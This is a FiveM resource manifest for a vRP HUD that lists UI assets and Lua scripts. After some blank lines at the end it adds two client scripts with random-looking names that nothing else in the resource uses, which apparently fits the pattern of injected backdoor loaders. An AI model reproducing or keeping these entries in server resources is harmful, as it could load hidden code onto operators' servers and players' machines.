dependency "vrp"

ui_page "ui/index.html"

files {
	"ui/index.html",
	"ui/assets/test.png",
	"ui/assets/hunger.svg",
	"ui/assets/thirst.svg",
	"ui/assets/inventory.svg",
	"ui/assets/battery.svg",
	"ui/assets/reseau.svg",
	"ui/assets/pp.jpg",
	'ui/fonts/pricedown.ttf',
	"ui/script.js",
	"ui/style.css",
	"ui/debounce.min.js"
}


client_scripts{ 
  "lib/Tunnel.lua",
  "lib/Proxy.lua",
  "client.lua"
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua"
}
client_script "dXKYKWpRFBlOIBufyi.lua"







client_script "13277.lua"